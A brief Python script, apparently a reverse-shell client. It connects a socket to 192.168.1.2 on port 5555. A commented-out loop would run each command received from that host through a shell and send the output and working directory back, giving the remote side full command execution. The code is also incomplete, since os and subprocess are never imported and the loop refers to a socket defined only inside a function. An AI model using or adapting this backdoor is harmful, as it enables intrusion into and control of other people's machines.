import socket
import curses


def connect_server():
	s = socket.socket()
	host = '192.168.1.2'
	port = 5555

	s.connect((host,port))

#while True:
#	data = s.recv(1024)
#
#	if data[:2].decode("utf-8") == 'cd':
#		os.chdir(data[3:].decode("utf-8")) 
#
#	if data[:].decode("utf-8") == 'quit':
#		s.close()
#		exit()
#
#	if len(data) > 0:
#		cmd = subprocess.Popen(data[:].decode("utf-8"), shell = True, stdin = subprocess.PIPE, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
#		output_byte = cmd.stdout.read() + cmd.stderr.read()
#		output_str = str(output_byte,"utf-8")
#		currentdir = os.getcwd() + "> "
#
#		s.send(str.encode(output_str + currentdir))
#
#
#		print(output_str + currentdir)
#



